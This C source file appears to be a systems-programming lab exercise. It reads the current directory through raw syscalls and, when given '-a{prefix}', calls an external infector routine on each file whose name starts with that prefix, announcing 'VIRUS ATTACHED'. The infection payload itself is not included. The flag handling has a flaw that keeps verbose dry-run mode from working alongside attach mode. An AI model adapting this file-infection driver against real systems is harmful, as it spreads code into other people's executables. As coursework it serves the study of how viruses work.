#include "util.h"

#define SYS_WRITE 4
#define STDOUT 1
#define SYS_OPEN 5
#define O_RDONLY 0
#define O_WRONLY 1
#define O_APPEND 1024
#define SYS_GETDENTS 141
#define SYS_EXIT 1

#define BUF_SIZE 8192

extern int system_call();
extern void infection();
extern void infector(char *filename);

struct linux_dirent
{
    long inode;         /* Inode number */
    long offset;        /* Offset to the next dirent*/
    unsigned short len; /* Length of this record*/
    char name[];        /* Filename (null-terminated)*/
};

int ends_with(const char *str, const char *suffix)
{
    int str_len = strlen(str);
    int suffix_len = strlen(suffix);
    if (suffix_len > str_len)
    {
        return 0;
    }
    return strncmp(str + str_len - suffix_len, suffix, suffix_len) == 0;
}

int main(int argc, char *argv[], char *envp[])
{
    char buf[BUF_SIZE];
    int fd, nread;
    struct linux_dirent *d;
    int bpos;
    char *prefix = 0;
    int attach_virus = 0;
    int verbose = 0;

    /* Check for -a{prefix} argument*/
    if (argc > 1 && argv[1][0] == '-' && argv[1][1] == 'a')
    {
        prefix = argv[1] + 2;
        attach_virus = 1;
    }

    /* Check for -v argument (verbose mode)*/
    if (argc > 1 && argv[1][0] == '-' && argv[1][1] == 'v')
    {
        verbose = 1;
    }

    fd = system_call(SYS_OPEN, ".", O_RDONLY, 0);
    if (fd == -1)
    {
        system_call(SYS_WRITE, STDOUT, "Error opening directory\n", 24);
        system_call(SYS_EXIT, 0x55);
    }

    nread = system_call(SYS_GETDENTS, fd, buf, BUF_SIZE);
    if (nread == -1)
    {
        system_call(SYS_WRITE, STDOUT, "Error reading directory\n", 24);
        system_call(SYS_EXIT, 0x55);
    }

    for (bpos = 0; bpos < nread;)
    {
        d = (struct linux_dirent *)(buf + bpos);
        system_call(SYS_WRITE, STDOUT, d->name, strlen(d->name));

        if (ends_with(d->name, ".c") || ends_with(d->name, ".h"))
        {
            system_call(SYS_WRITE, STDOUT, "\n", 1);
            system_call(SYS_WRITE, STDOUT, "\n", 1);
        }
        else if (attach_virus && strncmp(d->name, prefix, strlen(prefix)) == 0)
        {
            if (verbose)
            {
                system_call(SYS_WRITE, STDOUT, " [VIRUS WOULD BE ATTACHED]\n", 26);
            }
            else
            {
                system_call(SYS_WRITE, STDOUT, " VIRUS ATTACHED\n", 16);
                infector(d->name);
            }
        }
        else
        {
            system_call(SYS_WRITE, STDOUT, "\n", 1);
        }
        bpos += d->len;
    }
    system_call(SYS_EXIT, 0);
    return 0; /* This line will never be reached*/
}